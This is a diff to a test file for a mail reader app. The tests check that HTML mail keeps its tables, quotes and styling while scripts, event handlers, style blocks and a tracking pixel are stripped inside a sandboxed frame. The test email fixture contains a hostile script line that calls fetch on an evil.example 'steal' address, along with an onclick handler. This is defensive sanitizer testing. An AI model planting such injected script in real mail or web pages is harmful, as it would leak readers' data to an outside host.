@@ -42,7 +42,25 @@ const MESSAGES = [
     subject: '九月份報價單',
     from: { name: '王小明', address: 'ming@abc.com' },
     received: '2026-09-08T02:10:00Z',
-    body: '<p>附上九月份報價單，單價 1,200 元。</p><p>請 staff 確認後回覆。</p>',
+    /* Shaped like the mail people actually get: a table of figures, a quoted
+       reply, a signature block, a tracking pixel and a link -- plus the script
+       and the handler that a reader has to refuse. */
+    body: [
+      '<html><head><style>.x{color:red}</style></head><body>',
+      '<h2>九月份報價單</h2>',
+      '<table border="1" cellpadding="4"><tr><th>品名</th><th>數量</th><th>單價</th></tr>',
+      '<tr><td>螺絲</td><td align="right">500</td><td align="right">1,200</td></tr>',
+      '<tr><td>螺帽</td><td align="right">300</td><td align="right">800</td></tr></table>',
+      '<blockquote>上一封信說：交期改為九月二十日</blockquote>',
+      '<p style="color:#036;font-size:13px">請 staff 確認後回覆。</p>',
+      '<p><a href="https://abc.example/quote/R43805">線上檢視</a> 或 ',
+      '<a href="https://abc.example/confirm">直接確認</a></p>',
+      '<img src="https://track.abc.example/open.gif?id=42" width="1" height="1">',
+      '<script>fetch("https://evil.example/steal")</scr' + 'ipt>',
+      '<div onclick="bad()">點我</div>',
+      '<p class="x">王小明｜業務部</p>',
+      '</body></html>'
+    ].join(''),
     attachments: [{ id: 'ATT-1', name: '報價單-九月.txt', type: 'text/plain', content: '品名,單價\n螺絲,1200\n' }]
   },
   {
@@ -341,12 +359,95 @@ export async function spec(t, app) {
         };
       `);
       assert.equal(r.err, undefined, r.err);
-      assert.ok(r.text.includes('單價 1,200 元'), '內文沒有讀出來：' + JSON.stringify(r.text));
-      assert.ok(!/<p>|<\/p>/.test(r.text), 'HTML 應該已經轉成純文字');
+      assert.ok(r.text.includes('螺絲') && r.text.includes('1,200'),
+        '內文沒有讀出來：' + JSON.stringify(r.text));
+      assert.ok(!/<p>|<\/p>|<table/i.test(r.text),
+        '純文字那一份要真的是純文字（畫面上的排版是另外一份）');
       assert.equal(r.atts.length, 1);
       assert.equal(r.atts[0].name, '報價單-九月.txt');
       assert.equal(r.atts[0].stored, true, '附件位元組要真的在本機：' + JSON.stringify(r.atts[0]));
       assert.ok(r.atts[0].bytes > 0);
+    });
+
+    await t.test('信件看起來還是那封信：表格與引言留著，腳本與追蹤像素不留', async () => {
+      /* The reader used to convert every body to text, which is safe and, as the
+         user put it, not acceptable -- a table of figures and a signature block
+         arrived as one paragraph. This checks the three layers together, in the
+         running program: the markup is rebuilt from an allowed list, the frame
+         cannot run scripts, and the document fetches nothing. */
+      const r = await run(cdp, `
+        /* From a known state, like the link test: a window left over from an
+           earlier step would make this measure something else. */
+        (AIOS.apps.instances() || []).forEach(function (inst) {
+          if (inst && inst.def && inst.def.id === 'mail' && inst.win) {
+            try { AIOS.wm.close(inst.win); } catch (e) { }
+          }
+        });
+        await new Promise(function (r) { setTimeout(r, 200); });
+
+        var err = '';
+        try { await AIOS.apps.launch('mail', '<quote-0908@abc.com>'); }
+        catch (e) { err = String((e && e.message) || e); }
+
+        var frame = null;
+        for (var i = 0; i < 80; i++) {
+          frame = document.querySelector('.ml-frame');
+          if (frame && frame.srcdoc) break;
+          await new Promise(function (r) { setTimeout(r, 100); });
+        }
+        if (!frame) {
+          return {
+            err: 'no frame', launchErr: err,
+            panes: document.querySelectorAll('.ml-read').length,
+            wins: (AIOS.apps.instances() || []).map(function (i) { return i.def && i.def.id; }),
+            pane: (document.querySelector('.ml-read') || {}).textContent
+          };
+        }
+
+        var doc = frame.srcdoc;
+        var links = [].slice.call(document.querySelectorAll('.ml-link-url'))
+          .map(function (n) { return n.textContent; });
+        return {
+          sandbox: frame.getAttribute('sandbox'),
+          hasCsp: doc.indexOf('Content-Security-Policy') >= 0,
+          csp: (/content="([^"]+)"/.exec(doc) || [])[1] || '',
+          keptTable: doc.indexOf('<table') >= 0,
+          keptQuote: doc.indexOf('<blockquote') >= 0,
+          keptHeading: doc.indexOf('<h2') >= 0,
+          keptAlign: doc.indexOf('align="right"') >= 0,
+          keptColour: doc.indexOf('color:#036') >= 0,
+          sawScript: /<script/i.test(doc),
+          sawHandler: /\son[a-z]+\s*=/i.test(doc),
+          sawTracker: doc.indexOf('track.abc.example') >= 0,
+          sawStyleBlock: /<style>\.x/.test(doc),
+          imagePlaceholder: doc.indexOf('［圖片］') >= 0,
+          linkList: links,
+          hrefInMarkup: /href=/.test(doc)
+        };
+      `, { timeout: 60000 });
+
+      assert.equal(r.err, undefined,
+        r.err + '（launch：' + JSON.stringify(r.launchErr) + '；視窗：' + JSON.stringify(r.wins) +
+        '；閱讀窗格：' + r.panes + '；內容：' + JSON.stringify(String(r.pane || '').slice(0, 120)) + '）');
+      assert.equal(r.sandbox, '', 'frame 必須是 sandbox 而且不給 allow-scripts');
+      assert.ok(r.hasCsp, '文件要自帶政策');
+      assert.ok(/default-src [^;]*none/.test(r.csp), 'default-src none 是那條線：' + r.csp);
+
+      assert.ok(r.keptTable && r.keptQuote && r.keptHeading, '表格、引言、標題都要留著');
+      assert.ok(r.keptAlign, '數字靠右是排版的一部分');
+      assert.ok(r.keptColour, '顏色留著，不然簽名檔就不見了');
+
+      assert.equal(r.sawScript, false, '腳本不能留在文件裡');
+      assert.equal(r.sawHandler, false, '事件處理器也不行');
+      assert.equal(r.sawStyleBlock, false, '<style> 整塊丟掉');
+      assert.equal(r.sawTracker, false,
+        '追蹤像素的網址不能出現在標記裡——出現了就會被抓，那就是讀取回報');
+      assert.ok(r.imagePlaceholder, '擋下來的圖要留一個看得見的缺口');
+
+      assert.equal(r.hrefInMarkup, false, '連結不能直接點得出去');
+      assert.equal(r.linkList.length, 2, '真正的網址要列在信底下：' + JSON.stringify(r.linkList));
+      assert.ok(r.linkList[0].includes('abc.example/quote'), r.linkList.join(' | '));
+      assert.ok(!r.linkList.join(' ').includes('evil.example'), '腳本裡的網址不是連結');
     });
 
     await t.test('附件另存到沙箱，會先問過，而且存下來的檔案記得自己來自信件', async () => {
@@ -515,6 +616,7 @@ export async function spec(t, app) {
           .map(function (p) { return p.textContent.slice(0, 80); });
         return {
           text: pane ? pane.textContent.slice(0, 600) : '',
+          frame: !!(pane && pane.querySelector('.ml-frame')),
           panes: any, err: err,
           wins: (AIOS.apps.instances() || []).map(function (i) { return i.def && i.def.id; })
         };
@@ -523,7 +625,7 @@ export async function spec(t, app) {
         '用 Message-ID 開信件視窗沒有開到。launch 說：' + JSON.stringify(r.err) +
         '；畫面上的視窗：' + JSON.stringify(r.wins) +
         '；閱讀窗格：' + JSON.stringify(r.panes));
-      assert.ok(r.text.includes('1,200'), '內文應該跟著出來');
+      assert.ok(r.frame, '內文在 frame 裡，所以 frame 要在：' + JSON.stringify(r.panes));
     });
 
     await t.test('這條路上沒有任何能改動真實信箱的呼叫', async () => {
